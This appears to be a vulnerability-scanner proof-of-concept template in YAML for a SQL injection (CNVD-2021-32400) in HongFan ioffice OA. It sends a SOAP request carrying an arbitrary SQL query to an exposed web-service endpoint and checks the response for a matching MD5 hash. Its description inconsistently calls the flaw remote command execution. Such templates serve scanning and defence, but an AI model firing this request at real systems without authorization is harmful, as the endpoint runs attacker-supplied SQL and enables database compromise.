tmp/sql/yaml-poc-hongfan-ioffice-sql_injection-CNVD-2021-32400.yml

name: poc-yaml-hongfan-ioffice-oa-cnvd-2021-32400-sqli
binding: 80585508-b2f8-4ab4-b350-9a52c7d3b709
manual: true
detail:
    author: Aurora
    links:
        - http://www.ioffice.cn/newsinfo/1616026.html
    description: HongFan ioffice OA has remote command execution vulnerabilities, causing attackers to gain server permissions.
    extra:
        dock: app="ioffice"
        product: ioffice
        homepage: http://www.ioffice.cn/
    vulnerability:
        id: CT-456715
        level: high
transport: http
set:
    r1: randomInt(2000000, 4000000)
rules:
    r1:
        request:
            method: POST
            path: /ioffice/prg/set/wss/ioAssistance.asmx
            follow_redirects: true
            headers:
                Content-Type: text/xml; charset=utf-8
            body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n  <soap:Body>\r\n    <GetLoginedEmpNoReadedInf xmlns=\"http://tempuri.org/\">\r\n      <sql>select SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{r1}}')),3,32)</sql>\r\n    </GetLoginedEmpNoReadedInf>\r\n  </soap:Body>\r\n</soap:Envelope>"
        expression: response.status == 200 && response.body.bcontains(b"<Column1>") && response.body.bcontains(bytes(md5(string(r1))))
expression: r1()
